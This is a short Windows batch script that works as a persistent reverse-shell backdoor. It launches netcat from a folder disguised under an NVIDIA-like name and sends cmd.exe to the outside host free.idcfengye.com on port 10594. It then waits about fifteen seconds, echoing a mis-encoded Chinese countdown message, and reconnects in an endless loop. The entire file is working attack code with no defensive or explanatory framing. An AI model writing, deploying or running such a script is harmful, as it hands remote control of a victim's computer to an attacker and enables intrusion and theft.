
:on
"C:\ProgramData\NVIDIA DATE\nc64.exe" free.idcfengye.com 10594 -e cmd.exe

echo off
set A=16
:LOOP
SET /A A-=1
echo  %A% ÃëºóÖØÐÂÖ´ÐÐ
PING -w 2 -n 2 127.0.0.1 >NUL 2>&1
IF %A% EQU 1 GOTO USN
GOTO LOOP
:USN
echo on
goto on
